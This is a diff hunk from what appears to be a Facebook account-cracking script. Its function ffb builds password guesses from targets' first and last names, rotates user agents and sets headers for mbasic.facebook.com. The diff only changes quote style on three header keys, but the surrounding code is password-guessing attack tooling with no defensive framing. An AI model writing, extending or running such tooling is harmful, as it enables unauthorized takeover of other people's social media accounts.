@@ -1274,9 +1274,9 @@ def ffb(ids,names,passlist):
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
                         head = {
-    'method': 'GET', 
-    'path': '/',
-    'scheme': 'https', 
+    "method": 'GET', 
+    "path": '/',
+    "scheme": 'https', 
     'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
